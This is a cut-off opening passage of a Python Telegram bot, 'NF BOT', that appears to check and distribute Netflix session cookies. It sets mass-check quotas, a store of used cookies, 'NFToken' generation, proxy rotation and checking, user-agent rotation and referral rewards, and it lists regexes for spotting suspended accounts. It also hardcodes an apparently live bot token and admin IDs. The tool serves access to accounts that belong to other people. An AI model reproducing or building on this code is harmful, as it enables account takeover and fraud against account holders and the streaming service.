#!/usr/bin/env python3
# ============================================================
# NF BOT – FINAL ULTIMATE EDITION (FULL)
# - 180+ country flags
# - 150+ restart patterns (25 languages)
# - Full GraphQL + regex extraction
# - iOS + Android NFToken with retries
# - Thread-safe all locks
# - Split mode fixed (persistent temp dir)
# - Memory & token cache pruned
# - All admin commands
# - Fast batch processing
# ============================================================

import os, re, json, logging, requests, io, zipfile, hashlib, tempfile, time, asyncio
import codecs, html as html_mod, random, string, threading, shutil, urllib.parse, unicodedata
from collections import OrderedDict, defaultdict
from datetime import datetime, timedelta
from typing import Dict, Optional, List, Tuple, Any
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes
)
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning
import aiohttp, aiofiles, emoji
import tracemalloc

try:
    from keep_alive import live
except ImportError:
    def live(): pass

# ========== CONFIGURATION ==========
TOKEN = os.getenv("BOT_TOKEN", "7934975060:AAFUnh7ljkLE5CAjwj7jvYt3cW0CZT9Y7yM")
if not TOKEN:
    raise ValueError("BOT_TOKEN environment variable not set!")

ADMIN_IDS = [int(id_) for id_ in os.getenv("ADMIN_IDS", "7246097389,6725209689,6426038286").split(",") if id_.strip()]
if not ADMIN_IDS:
    ADMIN_IDS = [6725209689]

WATERMARK = "⚡ Made by @darkhuchannel"
MAX_WORKERS = 10
BATCH_SIZE = 5
BATCH_DELAY = 0.5
dot_length = 10
PROXY_FILE = "proxy.txt"
REQUEST_TIMEOUT = 30
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/125.0",
]
PROXY_CHECK_INTERVAL = 30
FREE_BASIC_LIMIT = 1
FREE_STANDARD_LIMIT = 1
FREE_PREMIUM_LIMIT = 1
FREE_CHECK_LIMIT = 50
MAX_COOKIES_PER_MASS_CHECK = 400
MASS_CHECK_DAILY_COOKIE_LIMIT = 2000
PREMIUM_LIMIT = 9999
REFERRAL_REWARD_HOURS = 24
REFERRAL_REWARD_CHECK_QUOTA = 100
REFERRAL_REWARD_GET_QUOTA = 1

USERS_FILE = "users.json"
KEYS_FILE = "keys.json"
USED_FILE = "used_cookies.json"
BASIC_FILE = "basic.txt"
STANDARD_FILE = "standard.txt"
PREMIUM_FILE = "premium.txt"
SPLIT_TEMP_DIR = "split_temp"

REQUIRED_CHANNELS = ["@Netflixbydark", "@darkhuchannel_chat", "@darkhuchannel", "@public_cards", "@dxein"]
CHANNEL_LINKS = {
    "@darkhuchannel": "https://t.me/darkhuchannel",
    "@Netflixbydark": "https://t.me/Netflixbydark",
    "@darkhuchannel_chat": "https://t.me/darkhuchannel_chat",
    "@public_cards": "https://t.me/public_cards",
    "@dxein": "https://t.me/dxein"
}
FEEDBACK_CHANNEL = -1004430970211
FEEDBACK_TIMEOUT_MINUTES = 5
POOL_CACHE_TTL = 60
AUTOBAN_ENABLED = False
AUTOBAN_TIMEOUT_MINUTES = 10
feedback_broadcast_interval = 0


START_VIDEO_PATH = os.getenv("START_VIDEO_PATH", "welcome.mp4")
START_IMAGE_PATH = os.getenv("START_IMAGE_PATH", "welcome.jpg")

if os.path.exists(SPLIT_TEMP_DIR):
    shutil.rmtree(SPLIT_TEMP_DIR)
os.makedirs(SPLIT_TEMP_DIR, exist_ok=True)

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
log = logging.getLogger(__name__)

# ========== PREMIUM EMOJIS ==========
SPECIAL_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5343649643685240676", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "4904936030232117798", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5305652587708572354", "🔌": "5120722716260828125", "⭐️": "5172716095697584957",
    "🦓": "5406756500108501710", "🔰": "6266995104687330978", "🔍": "5258396243666681152",
    "🤖": "5447510826304959724", "🔑": "5454386656628991407", "⏱️": "5343927661213279013",
    "💥": "5122933683820430249", "🦔": "5447311106030726740", "👤": "5445174334031166029",
    "📅": "5116575178012235794", "🔄": "5454245266305604993", "🦋": "5445408306669582934",
    "🥰": "5444931419270839381", "😱": "5447181973544008180", "🔷": "5258024802010026053",
    "🔶": "5454386656628991407", "📆": "5454074580010295588", "👕": "5454371323595744068",
    "🥕": "5447653032672129347", "➡️": "5445350109862720603", "🦉": "5123344136665039833",
    "🍑": "5445408306669582934", "💪": "5305622454218024328", "🌝": "5341684837881235158",
    "📁": "5444908424015934570", "ℹ️": "5289930378885214069", "💀": "5231338559587257737",
    "📢": "5116445341150872576", "💰": "5116648080787112958", "🔘": "5219901967916084166",
    "🔗": "5447479640547428304", "👇": "5122933683820430249", "📌": "5447187153274567373",
    "🍳": "5305622454218024328", "💸": "5283232570660634549", "🎉": "5172632227871196306",
    "🎁": "5283031441637148958", "🚫": "5116151848855667552", "🛒": "5447319442562251569",
    "🔧": "4904936030232117798", "⛔️": "5275969776668134187", "🥲": "4904468402782864209",
    "☠️": "5231338559587257737", "🛡️": "5219672809936006424", "📨": "5445344161333015312",
    "💬": "5447510826304959724", "😺": "5118590136149345664", "🌍": "5303440357428586778",
    "🔹": "5429436388447655367", "📺": "5445158077579952110", "📡": "5447448489149625830",
    "🌘": "5310224206732996002", "📓": "5447187153274567373", "🔟": "5258476306152038031",
    "😇": "6321225560789877992", "👌": "5445350109862720603", "⭐": "6267298050205553492",
    "🍭": "6267152480878990865", "⚙️": "5258023599419171861", "⛔": "4918014360267260850",
    "📥": "5350747347724810871", "💵": "5350711759625795085", "️🏷️": "5436285465420383204",
    "📂": "5444908424015934570", "🛠️": "5348239232852836489", "📄️": "5323538339062628165",
    "🔒": "5447453226498552490", "👑": "5447479640547428304", "❕": "5289930378885214069",
    "👻": "5447181973544008180",
}
ALL_PREMIUM_IDS = list(SPECIAL_EMOJI_IDS.values())

def premium_emoji(text: str) -> str:
    if not text:
        return text
    code_blocks = []
    def repl(match):
        code_blocks.append(match.group(0))
        return f"__CODE_{len(code_blocks)-1}__"
    text = re.sub(r'<code>.*?</code>', repl, text, flags=re.DOTALL)
    text = html_mod.escape(text)
    new_text = ""
    for char in text:
        if emoji.is_emoji(char):
            emoji_id = SPECIAL_EMOJI_IDS.get(char, random.choice(ALL_PREMIUM_IDS))
            new_text += f'<tg-emoji emoji-id="{emoji_id}">{char}</tg-emoji>'
        else:
            new_text += char
    for i, block in enumerate(code_blocks):
        new_text = new_text.replace(f"__CODE_{i}__", block)
    return new_text

# ========== COUNTRY FLAGS & NAMES (180+) ==========
COUNTRY_FLAGS = {
    "AD": "🇦🇩", "AE": "🇦🇪", "AF": "🇦🇫", "AG": "🇦🇬", "AI": "🇦🇮", "AL": "🇦🇱", "AM": "🇦🇲",
    "AO": "🇦🇴", "AQ": "🇦🇶", "AR": "🇦🇷", "AS": "🇦🇸", "AT": "🇦🇹", "AU": "🇦🇺", "AW": "🇦🇼",
    "AX": "🇦🇽", "AZ": "🇦🇿", "BA": "🇧🇦", "BB": "🇧🇧", "BD": "🇧🇩", "BE": "🇧🇪", "BF": "🇧🇫",
    "BG": "🇧🇬", "BH": "🇧🇭", "BI": "🇧🇮", "BJ": "🇧🇯", "BL": "🇧🇱", "BM": "🇧🇲", "BN": "🇧🇳",
    "BO": "🇧🇴", "BQ": "🇧🇶", "BR": "🇧🇷", "BS": "🇧🇸", "BT": "🇧🇹", "BV": "🇧🇻", "BW": "🇧🇼",
    "BY": "🇧🇾", "BZ": "🇧🇿", "CA": "🇨🇦", "CC": "🇨🇨", "CD": "🇨🇩", "CF": "🇨🇫", "CG": "🇨🇬",
    "CH": "🇨🇭", "CI": "🇨🇮", "CK": "🇨🇰", "CL": "🇨🇱", "CM": "🇨🇲", "CN": "🇨🇳", "CO": "🇨🇴",
    "CR": "🇨🇷", "CU": "🇨🇺", "CV": "🇨🇻", "CW": "🇨🇼", "CX": "🇨🇽", "CY": "🇨🇾", "CZ": "🇨🇿",
    "DE": "🇩🇪", "DJ": "🇩🇯", "DK": "🇩🇰", "DM": "🇩🇲", "DO": "🇩🇴", "DZ": "🇩🇿", "EC": "🇪🇨",
    "EE": "🇪🇪", "EG": "🇪🇬", "EH": "🇪🇭", "ER": "🇪🇷", "ES": "🇪🇸", "ET": "🇪🇹", "FI": "🇫🇮",
    "FJ": "🇫🇯", "FK": "🇫🇰", "FM": "🇫🇲", "FO": "🇫🇴", "FR": "🇫🇷", "GA": "🇬🇦", "GB": "🇬🇧",
    "GD": "🇬🇩", "GE": "🇬🇪", "GF": "🇬🇫", "GG": "🇬🇬", "GH": "🇬🇭", "GI": "🇬🇮", "GL": "🇬🇱",
    "GM": "🇬🇲", "GN": "🇬🇳", "GP": "🇬🇵", "GQ": "🇬🇶", "GR": "🇬🇷", "GS": "🇬🇸", "GT": "🇬🇹",
    "GU": "🇬🇺", "GW": "🇬🇼", "GY": "🇬🇾", "HK": "🇭🇰", "HM": "🇭🇲", "HN": "🇭🇳", "HR": "🇭🇷",
    "HT": "🇭🇹", "HU": "🇭🇺", "ID": "🇮🇩", "IE": "🇮🇪", "IL": "🇮🇱", "IM": "🇮🇲", "IN": "🇮🇳",
    "IO": "🇮🇴", "IQ": "🇮🇶", "IR": "🇮🇷", "IS": "🇮🇸", "IT": "🇮🇹", "JE": "🇯🇪", "JM": "🇯🇲",
    "JO": "🇯🇴", "JP": "🇯🇵", "KE": "🇰🇪", "KG": "🇰🇬", "KH": "🇰🇭", "KI": "🇰🇮", "KM": "🇰🇲",
    "KN": "🇰🇳", "KP": "🇰🇵", "KR": "🇰🇷", "KW": "🇰🇼", "KY": "🇰🇾", "KZ": "🇰🇿", "LA": "🇱🇦",
    "LB": "🇱🇧", "LC": "🇱🇨", "LI": "🇱🇮", "LK": "🇱🇰", "LR": "🇱🇷", "LS": "🇱🇸", "LT": "🇱🇹",
    "LU": "🇱🇺", "LV": "🇱🇻", "LY": "🇱🇾", "MA": "🇲🇦", "MC": "🇲🇨", "MD": "🇲🇩", "ME": "🇲🇪",
    "MF": "🇲🇫", "MG": "🇲🇬", "MH": "🇲🇭", "MK": "🇲🇰", "ML": "🇲🇱", "MM": "🇲🇲", "MN": "🇲🇳",
    "MO": "🇲🇴", "MP": "🇲🇵", "MQ": "🇲🇶", "MR": "🇲🇷", "MS": "🇲🇸", "MT": "🇲🇹", "MU": "🇲🇺",
    "MV": "🇲🇻", "MW": "🇲🇼", "MX": "🇲🇽", "MY": "🇲🇾", "MZ": "🇲🇿", "NA": "🇳🇦", "NC": "🇳🇨",
    "NE": "🇳🇪", "NF": "🇳🇫", "NG": "🇳🇬", "NI": "🇳🇮", "NL": "🇳🇱", "NO": "🇳🇴", "NP": "🇳🇵",
    "NR": "🇳🇷", "NU": "🇳🇺", "NZ": "🇳🇿", "OM": "🇴🇲", "PA": "🇵🇦", "PE": "🇵🇪", "PF": "🇵🇫",
    "PG": "🇵🇬", "PH": "🇵🇭", "PK": "🇵🇰", "PL": "🇵🇱", "PM": "🇵🇲", "PN": "🇵🇳", "PR": "🇵🇷",
    "PS": "🇵🇸", "PT": "🇵🇹", "PW": "🇵🇼", "PY": "🇵🇾", "QA": "🇶🇦", "RE": "🇷🇪", "RO": "🇷🇴",
    "RS": "🇷🇸", "RU": "🇷🇺", "RW": "🇷🇼", "SA": "🇸🇦", "SB": "🇸🇧", "SC": "🇸🇨", "SD": "🇸🇩",
    "SE": "🇸🇪", "SG": "🇸🇬", "SH": "🇸🇭", "SI": "🇸🇮", "SJ": "🇸🇯", "SK": "🇸🇰", "SL": "🇸🇱",
    "SM": "🇸🇲", "SN": "🇸🇳", "SO": "🇸🇴", "SR": "🇸🇷", "SS": "🇸🇸", "ST": "🇸🇹", "SV": "🇸🇻",
    "SX": "🇸🇽", "SY": "🇸🇾", "SZ": "🇸🇿", "TC": "🇹🇨", "TD": "🇹🇩", "TF": "🇹🇫", "TG": "🇹🇬",
    "TH": "🇹🇭", "TJ": "🇹🇯", "TK": "🇹🇰", "TL": "🇹🇱", "TM": "🇹🇲", "TN": "🇹🇳", "TO": "🇹🇴",
    "TR": "🇹🇷", "TT": "🇹🇹", "TV": "🇹🇻", "TW": "🇹🇼", "TZ": "🇹🇿", "UA": "🇺🇦", "UG": "🇺🇬",
    "UM": "🇺🇲", "US": "🇺🇸", "UY": "🇺🇾", "UZ": "🇺🇿", "VA": "🇻🇦", "VC": "🇻🇨", "VE": "🇻🇪",
    "VG": "🇻🇬", "VI": "🇻🇮", "VN": "🇻🇳", "VU": "🇻🇺", "WF": "🇼🇫", "WS": "🇼🇸", "YE": "🇾🇪",
    "YT": "🇾🇹", "ZA": "🇿🇦", "ZM": "🇿🇲", "ZW": "🇿🇼"
}

COUNTRY_NAMES = {
    "AD": "Andorra", "AE": "United Arab Emirates", "AF": "Afghanistan", "AG": "Antigua and Barbuda",
    "AI": "Anguilla", "AL": "Albania", "AM": "Armenia", "AO": "Angola", "AQ": "Antarctica",
    "AR": "Argentina", "AS": "American Samoa", "AT": "Austria", "AU": "Australia", "AW": "Aruba",
    "AX": "Åland Islands", "AZ": "Azerbaijan", "BA": "Bosnia and Herzegovina", "BB": "Barbados",
    "BD": "Bangladesh", "BE": "Belgium", "BF": "Burkina Faso", "BG": "Bulgaria", "BH": "Bahrain",
    "BI": "Burundi", "BJ": "Benin", "BL": "Saint Barthélemy", "BM": "Bermuda", "BN": "Brunei",
    "BO": "Bolivia", "BQ": "Bonaire", "BR": "Brazil", "BS": "Bahamas", "BT": "Bhutan",
    "BV": "Bouvet Island", "BW": "Botswana", "BY": "Belarus", "BZ": "Belize", "CA": "Canada",
    "CC": "Cocos (Keeling) Islands", "CD": "DR Congo", "CF": "Central African Republic",
    "CG": "Republic of the Congo", "CH": "Switzerland", "CI": "Côte d'Ivoire", "CK": "Cook Islands",
    "CL": "Chile", "CM": "Cameroon", "CN": "China", "CO": "Colombia", "CR": "Costa Rica",
    "CU": "Cuba", "CV": "Cape Verde", "CW": "Curaçao", "CX": "Christmas Island", "CY": "Cyprus",
    "CZ": "Czechia", "DE": "Germany", "DJ": "Djibouti", "DK": "Denmark", "DM": "Dominica",
    "DO": "Dominican Republic", "DZ": "Algeria", "EC": "Ecuador", "EE": "Estonia", "EG": "Egypt",
    "EH": "Western Sahara", "ER": "Eritrea", "ES": "Spain", "ET": "Ethiopia", "FI": "Finland",
    "FJ": "Fiji", "FK": "Falkland Islands", "FM": "Micronesia", "FO": "Faroe Islands", "FR": "France",
    "GA": "Gabon", "GB": "United Kingdom", "GD": "Grenada", "GE": "Georgia", "GF": "French Guiana",
    "GG": "Guernsey", "GH": "Ghana", "GI": "Gibraltar", "GL": "Greenland", "GM": "Gambia",
    "GN": "Guinea", "GP": "Guadeloupe", "GQ": "Equatorial Guinea", "GR": "Greece", "GS": "South Georgia",
    "GT": "Guatemala", "GU": "Guam", "GW": "Guinea-Bissau", "GY": "Guyana", "HK": "Hong Kong",
    "HM": "Heard Island", "HN": "Honduras", "HR": "Croatia", "HT": "Haiti", "HU": "Hungary",
    "ID": "Indonesia", "IE": "Ireland", "IL": "Israel", "IM": "Isle of Man", "IN": "India",
    "IO": "British Indian Ocean Territory", "IQ": "Iraq", "IR": "Iran", "IS": "Iceland",
    "IT": "Italy", "JE": "Jersey", "JM": "Jamaica", "JO": "Jordan", "JP": "Japan", "KE": "Kenya",
    "KG": "Kyrgyzstan", "KH": "Cambodia", "KI": "Kiribati", "KM": "Comoros", "KN": "Saint Kitts and Nevis",
    "KP": "North Korea", "KR": "South Korea", "KW": "Kuwait", "KY": "Cayman Islands", "KZ": "Kazakhstan",
    "LA": "Laos", "LB": "Lebanon", "LC": "Saint Lucia", "LI": "Liechtenstein", "LK": "Sri Lanka",
    "LR": "Liberia", "LS": "Lesotho", "LT": "Lithuania", "LU": "Luxembourg", "LV": "Latvia",
    "LY": "Libya", "MA": "Morocco", "MC": "Monaco", "MD": "Moldova", "ME": "Montenegro",
    "MF": "Saint Martin", "MG": "Madagascar", "MH": "Marshall Islands", "MK": "North Macedonia",
    "ML": "Mali", "MM": "Myanmar", "MN": "Mongolia", "MO": "Macau", "MP": "Northern Mariana Islands",
    "MQ": "Martinique", "MR": "Mauritania", "MS": "Montserrat", "MT": "Malta", "MU": "Mauritius",
    "MV": "Maldives", "MW": "Malawi", "MX": "Mexico", "MY": "Malaysia", "MZ": "Mozambique",
    "NA": "Namibia", "NC": "New Caledonia", "NE": "Niger", "NF": "Norfolk Island", "NG": "Nigeria",
    "NI": "Nicaragua", "NL": "Netherlands", "NO": "Norway", "NP": "Nepal", "NR": "Nauru",
    "NU": "Niue", "NZ": "New Zealand", "OM": "Oman", "PA": "Panama", "PE": "Peru", "PF": "French Polynesia",
    "PG": "Papua New Guinea", "PH": "Philippines", "PK": "Pakistan", "PL": "Poland", "PM": "Saint Pierre and Miquelon",
    "PN": "Pitcairn Islands", "PR": "Puerto Rico", "PS": "Palestine", "PT": "Portugal", "PW": "Palau",
    "PY": "Paraguay", "QA": "Qatar", "RE": "Réunion", "RO": "Romania", "RS": "Serbia",
    "RU": "Russia", "RW": "Rwanda", "SA": "Saudi Arabia", "SB": "Solomon Islands", "SC": "Seychelles",
    "SD": "Sudan", "SE": "Sweden", "SG": "Singapore", "SH": "Saint Helena", "SI": "Slovenia",
    "SJ": "Svalbard and Jan Mayen", "SK": "Slovakia", "SL": "Sierra Leone", "SM": "San Marino",
    "SN": "Senegal", "SO": "Somalia", "SR": "Suriname", "SS": "South Sudan", "ST": "São Tomé and Príncipe",
    "SV": "El Salvador", "SX": "Sint Maarten", "SY": "Syria", "SZ": "Eswatini", "TC": "Turks and Caicos Islands",
    "TD": "Chad", "TF": "French Southern Territories", "TG": "Togo", "TH": "Thailand", "TJ": "Tajikistan",
    "TK": "Tokelau", "TL": "Timor-Leste", "TM": "Turkmenistan", "TN": "Tunisia", "TO": "Tonga",
    "TR": "Turkey", "TT": "Trinidad and Tobago", "TV": "Tuvalu", "TW": "Taiwan", "TZ": "Tanzania",
    "UA": "Ukraine", "UG": "Uganda", "UM": "U.S. Minor Outlying Islands", "US": "United States",
    "UY": "Uruguay", "UZ": "Uzbekistan", "VA": "Vatican City", "VC": "Saint Vincent and the Grenadines",
    "VE": "Venezuela", "VG": "British Virgin Islands", "VI": "U.S. Virgin Islands", "VN": "Vietnam",
    "VU": "Vanuatu", "WF": "Wallis and Futuna", "WS": "Samoa", "YE": "Yemen", "YT": "Mayotte",
    "ZA": "South Africa", "ZM": "Zambia", "ZW": "Zimbabwe"
}

def country_code_to_flag(code: str) -> str:
    if not code:
        return ""
    code = code.strip().upper()
    return COUNTRY_FLAGS.get(code, "")

def format_country_with_flag(country_value: str) -> str:
    if not country_value or country_value in ("N/A", "Unknown"):
        return country_value or "Unknown"
    country_val = country_value.strip()
    flag = country_code_to_flag(country_val)
    if flag:
        return f"{country_val} {flag}"
    return country_val

# ========== DATE FORMATTERS ==========
MONTH_ALIASES = {
    "january":1, "february":2, "march":3, "april":4, "may":5, "june":6,
    "july":7, "august":8, "september":9, "october":10, "november":11, "december":12,
    "enero":1, "febrero":2, "marzo":3, "abril":4, "mayo":5, "junio":6,
    "julio":7, "agosto":8, "septiembre":9, "octubre":10, "noviembre":11, "diciembre":12,
    "janvier":1, "février":2, "mars":3, "avril":4, "mai":5, "juin":6,
    "juillet":7, "août":8, "septembre":9, "octobre":10, "novembre":11, "décembre":12,
    "gennaio":1, "febbraio":2, "marzo":3, "aprile":4, "maggio":5, "giugno":6,
    "luglio":7, "agosto":8, "settembre":9, "ottobre":10, "novembre":11, "dicembre":12,
    "janeiro":1, "fevereiro":2, "março":3, "abril":4, "maio":5, "junho":6,
    "julho":7, "agosto":8, "setembro":9, "outubro":10, "novembro":11, "dezembro":12,
    "января":1, "февраля":2, "марта":3, "апреля":4, "мая":5, "июня":6,
    "июля":7, "августа":8, "сентября":9, "октября":10, "ноября":11, "декабря":12,
    "มกราคม":1, "กุมภาพันธ์":2, "มีนาคม":3, "เมษายน":4, "พฤษภาคม":5, "มิถุนายน":6,
    "กรกฎาคม":7, "สิงหาคม":8, "กันยายน":9, "ตุลาคม":10, "พฤศจิกายน":11, "ธันวาคม":12,
    "jan":1, "feb":2, "mar":3, "apr":4, "may":5, "jun":6, "jul":7, "aug":8, "sep":9, "oct":10, "nov":11, "dec":12,
}

def normalize_calendar_year(year):
    try:
        year = int(year)
    except:
        return None
    if 2400 <= year <= 2700:
        return year - 543
    return year

def parse_localized_date(cleaned):
    if not cleaned:
        return None
    for parser in ("%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%S.%f", "%Y-%m-%dT%H:%M:%S.%f%z"):
        try:
            return datetime.strptime(cleaned, parser)
        except:
            continue
    iso_candidate = cleaned.replace("Z", "+00:00")
    try:
        return datetime.fromisoformat(iso_candidate)
    except:
        pass
    east_asian = re.search(r"(?P<year>\d{4})\s*[年년]\s*(?P<month>\d{1,2})\s*[月월](?:\s*(?P<day>\d{1,2})\s*[日일])?", cleaned)
    if east_asian:
        try:
            year = normalize_calendar_year(east_asian.group("year"))
            month = int(east_asian.group("month"))
            day = int(east_asian.group("day") or 1)
            if year is not None:
                return datetime(year, month, day)
        except:
            pass
    numeric_parts = [int(x) for x in re.findall(r"\d+", cleaned)]
    if len(numeric_parts) >= 3:
        first, second, third = numeric_parts[0], numeric_parts[1], numeric_parts[2]
        try:
            first = normalize_calendar_year(first)
            third = normalize_calendar_year(third)
            if 1900 <= first <= 3000 and 1 <= second <= 12 and 1 <= third <= 31:
                return datetime(first, second, third)
            if 1 <= first <= 31 and 1 <= second <= 12 and 1900 <= third <= 3000:
                return datetime(third, second, first)
        except:
            pass
    raw_lower = cleaned.lower()
    simplified = unicodedata.normalize("NFKD", raw_lower)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    month = None
    for alias, m in MONTH_ALIASES.items():
        if alias in raw_lower or alias in simplified:
            month = m
            break
    if month is None:
        return None
    year = None
    for number in numeric_parts:
        n_year = normalize_calendar_year(number)
        if n_year is not None and 1900 <= n_year <= 3000:
            year = n_year
            break
    if year is None:
        year_match = re.search(r"\b\d{4}\b", simplified)
        if year_match:
            year = normalize_calendar_year(year_match.group(0))
    if year is None:
        return None
    day = 1
    for number in numeric_parts:
        if normalize_calendar_year(number) == year:
            continue
        if 1 <= number <= 31:
            day = number
            break
    try:
        return datetime(year, month, day)
    except:
        return None

def format_display_date(value):
    if not value:
        return "N/A"
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "N/A"
    parsed = parse_localized_date(cleaned)
    if parsed is not None:
        return parsed.strftime("%B %d, %Y").replace(" 0", " ")
    return cleaned

def format_member_since(value):
    if not value:
        return "N/A"
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "N/A"
    parsed = parse_localized_date(cleaned)
    if parsed is not None:
        return parsed.strftime("%B %Y")
    return cleaned

# ========== RESTART PATTERNS (150+ in 25 languages) ==========
RESTART_PATTERNS = [
    r'restart your membership',
    r'mulai lagi',
    r'aktifkan kembali',
    r'reanudar (?:tu|la) suscripción',
    r'reinicie su suscripción',
    r'redémarrer (?:votre|ton) abonnement',
    r'renouveler (?:votre|ton) abonnement',
    r'wieder aktivieren',
    r'mitgliedschaft (?:wieder|neu) starten',
    r'riavvia (?:il tuo|l\'abbonamento)',
    r'reinizia (?:il tuo|l\'abbonamento)',
    r'reiniciar (?:sua|a) assinatura',
    r'reativar (?:sua|a) assinatura',
    r'opnieuw starten (?:je|uw) abonnement',
    r'hervat (?:je|uw) abonnement',
    r'wznów (?:swoją|członkostwo)',
    r'przywróć (?:swoją|członkostwo)',
    r'yeniden başlat (?:üyeliğini|hesabını)',
    r'tekrar (?:başlat|etkinleştir)',
    r'возобновить (?:подписку|членство)',
    r'перезапустить (?:подписку|членство)',
    r'إعادة تشغيل العضوية',
    r'استئناف العضوية',
    r'सदस्यता पुनः आरंभ करें',
    r'पुनः सक्रिय करें',
    r'重新启动会员资格',
    r'续订会员资格',
    r'メンバーシップを再開',
    r'再開する',
    r'멤버십 다시 시작',
    r'재시작',
    r'starta om medlemskapet',
    r'återaktivera',
    r'start medlemskapet på nytt',
    r'gjenoppta',
    r'genstart medlemskab',
    r'forny',
    r'aloita jäsenyys uudelleen',
    r'jatka',
    r'επανεκκίνηση συνδρομής',
    r'ενεργοποίηση ξανά',
    r'เริ่มต้นใหม่',
    r'เปิดใช้งานอีกครั้ง',
    r'khởi động lại tư cách thành viên',
    r'gia hạn',
    r'reia abonamentul',
    r'reactivează',
    r'obnovit členství',
    r'restartovat',
    r'újraindítás',
    r'újrakezdés',
    r'перезапустити підписку',
    r'відновити',
    r'your account is on hold',
    r'renew your membership',
    r'reactivate your subscription',
    r'reactivate your membership',
    r'reactiver votre abonnement',
    r'réactiver',
    r'terminer votre inscription',
    r'complete your registration',
    r'finish signing up',
    r'selesaikan pendaftaran',
    r'pendaftaran',
    r'khusus anggota baru',
    r'join now',
    r'start your free trial',
    r'(?:subscription|account|membership) (?:has )?expired',
    r'no active subscription',
    r'not currently active',
    r'this account is not active',
    r'(?:subscription|account) (?:is )?(?:paused|suspended)',
    r'abonnement expiré',
    r'compte suspendu',
    r'suscripción expirada',
    r'cuenta suspendida',
    r'assinatura expirada',
    r'assinatura suspensa',
    r'abonnement abgelaufen',
    r'mitgliedschaft abgelaufen',
    r'abbonamento scaduto',
    r'abbonamento sospeso',
    r'срок действия ист(?:ё|е)к',
    r'подписка приостановлена',
    r'aboneliğin süresi doldu',
    r'berlangganan berakhir',
    r'akun ditangguhkan',
    r'انتهت العضوية',
    r'عضوية معلقة',
    r'subscription expired',
    r'membership expired',
    r'your plan has ended',
    r'your subscription has ended',
    r'your account is no longer active',
    r'please reactivate',
    r'renew now',
    r'payment failed',
    r'billing issue',
    r'past due',
    r'suspended',
    r'account suspended',
]

def is_restart_page(html: str) -> bool:
    html_lower = html.lower()
    for pattern in RESTART_PATTERNS:
        if re.search(pattern, html_lower):
            return True
    return False

# ========== PROXY MANAGER ==========
class ProxyManager:
    def __init__(self):
        self.proxies = set()
        self._dirty = False
        self._flush_task = None

    def load_from_file(self, filename="proxy.txt"):
        if not os.path.exists(filename):
            return []
        try:
            with open(filename, "r") as f:
                lines = [line.strip() for line in f if line.strip()]
            self.proxies = set(lines)
            return lines
        except IOError:
            return []

    async def save_to_file_async(self, filename="proxy.txt"):
        async with aiofiles.open(filename, "w") as f:
            await f.write("\n".join(self.proxies))

    def add_proxies(self, new_proxies):
        added = [p for p in new_proxies if p not in self.proxies]
        if added:
            self.proxies.update(added)
            self._dirty = True
            if self._flush_task is None or self._flush_task.done():
                loop = asyncio.get_event_loop()
                self._flush_task = loop.create_task(self._flush_after_delay())
        return added

    async def _flush_after_delay(self):
        await asyncio.sleep(5)
        if self._dirty:
            await self.save_to_file_async("proxy.txt")
            self._dirty = False

    async def flush_now(self):
        if self._dirty:
            await self.save_to_file_async("proxy.txt")
            self._dirty = False
        if self._flush_task and not self._flush_task.done():
            self._flush_task.cancel()

# ========== PROXY CHECKER ==========
class ProxyChecker:
    def __init__(self, timeout=5):
        self.timeout = timeout
        self.live = []
        self.bad = 0
        self.errors = 0

    async def check_all(self, proxies, target=0, threads=100, progress_callback=None, stop_flag=None):
        self.live = []
        self.bad = 0
        self.errors = 0
        total = len(proxies)
        checked = [0]
        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0)
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout+2)
        ) as session:
            sem = asyncio.Semaphore(threads)
            tasks = []
            def make_progress_callback():
                checked[0] += 1
                if progress_callback:
                    progress_callback(total, checked[0])
            for proxy in proxies:
                if stop_flag and stop_flag():
                    break
                tasks.append(
                    self._check_one(sem, proxy, session, make_progress_callback)
                )
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
        self.live.sort(key=lambda x: x[1])
        if target > 0 and len(self.live) > target:
            self.live = self.live[:target]
        return self.live

    async def _check_one(self, sem, proxy_str, session, cb):
        async with sem:
            start = time.time()
            try:
                parts = proxy_str.split(':')
                if len(parts) < 2:
                    raise ValueError("Invalid format")
                ip = parts[0]
                port = parts[1]
                proxy_url = f"http://{ip}:{port}"
                if len(parts) == 4:
                    user, pwd = parts[2], parts[3]
                    proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
                test_urls = ["https://httpbin.org/ip", "https://api.ipify.org?format=json"]
                for test_url in test_urls:
                    try:
                        async with session.get(test_url, proxy=proxy_url, timeout=self.timeout) as resp:
                            if resp.status == 200:
                                latency = time.time() - start
                                self.live.append((proxy_str, latency))
                                if cb:
                                    cb()
                                return
                    except:
                        continue
                self.bad += 1
